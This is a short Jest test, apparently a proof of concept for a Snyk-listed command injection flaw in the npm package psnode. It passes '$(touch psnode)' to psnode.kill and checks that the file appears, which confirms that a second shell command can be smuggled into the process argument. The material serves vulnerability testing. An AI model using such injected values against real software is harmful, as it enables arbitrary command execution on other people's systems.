//https://snyk.io/vuln/SNYK-JS-PSNODE-1078543
test("Command Injection in psnode", () => 
{
	const psnode = require('psnode');
	const fs = require('fs')
	const path = './psnode'

	psnode.kill('$(touch psnode)', function() {});


	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});
